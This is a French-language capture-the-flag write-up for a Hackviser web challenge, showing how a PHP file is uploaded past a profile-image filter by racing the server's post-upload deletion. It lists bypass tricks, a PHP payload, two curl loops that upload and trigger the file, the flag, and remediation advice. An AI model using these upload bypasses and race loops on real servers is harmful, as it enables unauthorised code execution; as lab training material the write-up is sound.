# Write-up : Web Shell Upload - Hackviser

## Informations Générales

- **Challenge** : Web Shell Upload
- **Catégorie** : Web / File Upload
- **Difficulté** : VIP
- **Points** : 4
- **Objectif** : Téléverser un script PHP malveillant pour obtenir le nom d'hôte (*hostname*) du serveur.
- **URL** : `https://kind-triathlon.europe1.hackviser.space`

---

## 1. Reconnaissance Initiale

L'application présente une page de paramètres de profil permettant de téléverser une image de profil. L'analyse du code source HTML révèle les éléments suivants :

- Un formulaire avec `enctype="multipart/form-data"`.
- Un champ de fichier nommé `input_image`.
- Un bouton de soumission nommé `submit`.
- Les images semblent être servies depuis le répertoire `/uploads/`.

### Tentatives infructueuses (Vérifications classiques)

Plusieurs techniques de contournement standard ont été testées sans succès :

1. **Téléversement direct** : `shell.php` -> Échec (le fichier n'est pas trouvé dans `/uploads/`).
2. **Double extension** : `shell.php.jpg` -> Échec.
3. **Modification du Content-Type** : Envoi d'un fichier `.php` avec `Content-Type: image/jpeg` -> Échec.
4. **Magic Bytes** : Ajout de l'en-tête GIF (`GIF89a;`) au début du script PHP -> Échec.
5. **Contournement .htaccess** : Tentative de téléverser un fichier `.htaccess` pour redéfinir les types MIME -> Échec.

Toutes ces tentatives menaient à une erreur **404 Not Found** lors de l'accès au fichier, ce qui suggère que le serveur valide le fichier après le téléversement et le supprime s'il ne correspond pas aux critères attendus.

---

## 2. Analyse de la Vulnérabilité : Race Condition

Le comportement observé (un fichier brièvement accepté puis supprimé) est caractéristique d'une **Condition de Concurrence** (*Race Condition*). Le serveur suit probablement ce flux :

1. Le fichier est temporairement stocké dans `/uploads/`.
2. Un script de vérification analyse l'extension et le contenu.
3. Si le fichier est invalide, il est supprimé.

Il existe une fenêtre de temps infime entre l'étape 1 et l'étape 3 durant laquelle le fichier est accessible et peut être exécuté par le serveur web.

---

## 3. Exploitation

L'objectif est de "gagner la course" contre le script de suppression en accédant au fichier au moment exact où il est présent sur le disque.

### Étape 1 : Préparation du Payload

Création d'un script PHP simple pour extraire le nom d'hôte :

```php
<?php echo gethostname(); ?>
```

Enregistré sous le nom `hostname.php`.

### Étape 2 : Automatisation de l'attaque

Nous utilisons deux boucles simultanées.

**Boucle de Téléversement :**

```bash
for i in {1..50}; do 
    curl -s -X POST -F "input_image=@hostname.php" -F "submit=" https://kind-triathlon.europe1.hackviser.space > /dev/null; 
done
```

**Boucle d'Accès (Trigger) :**

```bash
while true; do 
    res=$(curl -s https://kind-triathlon.europe1.hackviser.space/uploads/hostname.php); 
    if [[ -n "$res" && ! "$res" =~ "404 Not Found" ]]; then 
        echo "$res"; 
        break; 
    fi; 
done
```

### Étape 3 : Exécution

En lançant les deux processus en parallèle, le serveur finit par traiter une requête de lecture PHP avant que le script de nettoyage ne supprime le fichier.

---

## 4. Résultats

Après quelques secondes de bombardement, le script a renvoyé la réponse attendue :

```text
galaxy
```

**Flag/Réponse** : `galaxy`

---

## Conclusion

Ce challenge démontre que les vérifications côté serveur ne sont pas infaillibles si elles ne sont pas atomiques. Pour corriger cette vulnérabilité, le serveur devrait :

1. Générer des noms de fichiers aléatoires.
2. Effectuer les vérifications dans un répertoire temporaire non accessible via le Web.
3. Ne déplacer le fichier vers le répertoire public `/uploads/` qu'une fois la validation terminée.
